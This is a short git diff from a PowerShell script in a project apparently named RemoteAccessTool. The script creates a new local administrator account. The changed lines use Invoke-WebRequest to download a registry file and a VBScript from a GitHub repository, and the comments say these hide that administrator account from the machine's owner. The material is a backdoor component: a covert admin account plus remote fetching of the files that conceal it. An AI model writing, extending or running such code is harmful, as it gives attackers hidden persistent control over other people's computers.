@@ -41,12 +41,12 @@ Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # create registery to hide local admin
 $reg_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/blob/main/files/admin.reg -OutFile 
+Invoke-WebRequest -Uri "https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/admin.reg" -OutFile 
 "$reg_file.reg"
 
 # visual basic script to register the registery
 $vbs_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/blob/main/files/confirm.vbs -OutFile 
+Invoke-WebRequest -Uri "https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/confirm.vbs" -OutFile 
 "$vbs_file.vbs"
 
 
